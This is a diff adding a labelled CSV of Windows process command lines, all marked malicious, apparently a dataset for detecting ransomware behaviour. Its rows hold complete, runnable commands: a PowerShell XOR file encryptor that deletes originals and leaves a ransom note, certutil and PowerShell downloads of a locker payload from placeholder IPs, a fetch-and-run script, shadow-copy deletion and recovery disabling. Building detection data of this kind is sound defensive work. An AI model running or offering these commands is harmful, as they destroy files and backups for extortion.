@@ -1,0 +1,21 @@
+process_name,command_line,label
+powershell.exe,"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""$k=Get-Content C:\ProgramData\targets.txt; foreach($f in $k){ try { $b=[System.IO.File]::ReadAllBytes($f); for($i=0;$i -lt $b.Length;$i++){ $b[$i]=$b[$i] -bxor 0x5A }; [System.IO.File]::WriteAllBytes($f + '.locked',$b); Remove-Item $f -Force; Set-Content -Path ((Split-Path $f) + '\README_RESTORE_FILES.txt') -Value 'Your files have been encrypted. Contact attacker for recovery.' -Force } catch {} }""",malicious
+powershell.exe,"powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""Get-PSDrive -PSProvider FileSystem | Select-Object Name,Root""",malicious
+cmd.exe,cmd.exe /c dir C:\Users\ /s /b *.docx *.xlsx *.pdf,malicious
+certutil.exe,certutil.exe -urlcache -split -f http://203.0.113.50/payloads/locker.exe C:\ProgramData\locker.exe,malicious
+locker.exe,C:\ProgramData\locker.exe --encrypt C:\Users --shares \\fileserver\finance --note C:\ProgramData\README_RESTORE.txt,malicious
+vssadmin.exe,vssadmin.exe delete shadows /all /quiet,malicious
+cmd.exe,cmd.exe /c dir C:\Users\*\Documents /s /b,malicious
+powershell.exe,"powershell.exe -NoProfile -WindowStyle Hidden -Command ""Get-SmbShare | Select-Object Name,Path""",malicious
+cmd.exe,"cmd.exe /c C:\ProgramData\locker.exe --path C:\ --path \\fileserver\finance --note ""Your files have been encrypted. Contact us at recovery@mailfence.com""",malicious
+bcdedit.exe,bcdedit.exe /set {default} recoveryenabled No,malicious
+powershell.exe,"powershell.exe -NoProfile -WindowStyle Hidden -Command ""Get-ChildItem -Path C:\Users -Include *.doc,*.docx,*.xls,*.xlsx,*.ppt,*.pptx,*.pdf,*.jpg,*.txt -File -Recurse -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName > C:\ProgramData\targets.txt""",malicious
+cmd.exe,cmd.exe /c dir C:\Users\*\Documents /s /b,malicious
+powershell.exe,"powershell.exe -NoProfile -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri http://192.168.56.10/payloads/locker.exe -OutFile C:\ProgramData\locker.exe""",malicious
+cmd.exe,"cmd.exe /c wmic logicaldisk get caption,freespace,size,volumename",malicious
+powershell.exe,"powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""$u='http://198.51.100.24/update.ps1';$p='$env:TEMP\update.ps1';Invoke-WebRequest -UseBasicParsing -Uri $u -OutFile $p;powershell.exe -ExecutionPolicy Bypass -File $p""",malicious
+vssadmin.exe,vssadmin.exe Delete Shadows /All /Quiet,malicious
+cmd.exe,cmd.exe /c net view \\fileserver,malicious
+powershell.exe,"powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""Get-ChildItem 'C:\Users','D:\','\\fileserver\shares' -Recurse -File -Include *.doc,*.docx,*.xls,*.xlsx,*.ppt,*.pptx,*.pdf | ForEach-Object { $b=[IO.File]::ReadAllBytes($_.FullName); [IO.File]::WriteAllBytes($_.FullName + '.locked',$b); Remove-Item $_.FullName -Force }""",malicious
+vssadmin.exe,vssadmin.exe Delete Shadows /All /Quiet,malicious
+vssadmin.exe,vssadmin.exe delete shadows /all /quiet,malicious
